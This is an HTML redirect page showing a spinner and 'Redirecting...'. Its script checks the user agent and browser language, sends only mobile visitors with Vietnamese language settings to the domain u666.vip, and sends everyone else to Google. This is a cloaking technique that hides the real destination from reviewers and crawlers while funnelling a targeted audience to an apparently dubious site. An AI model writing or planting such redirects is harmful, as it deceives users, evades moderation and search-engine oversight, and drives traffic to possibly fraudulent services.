<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            color: #333;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <p>Redirecting...</p>
    </div>
    <script>
        // 检测是否为移动设备
        const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|IEMobile|webOS|Symbian|PlayBook/i.test(navigator.userAgent);
        
        // 检测语言是否为越南语
        const lang = navigator.language || '';
        const languages = navigator.languages || [];
        const isVietnamese = lang.startsWith('vi') || languages.some(l => l.startsWith('vi'));
        
        // 根据条件跳转
        if (isMobile && isVietnamese) {
            window.location.href = 'https://u666.vip/';
        } else {
            window.location.href = 'https://www.google.com/';
        }
    </script>
</body>
</html>
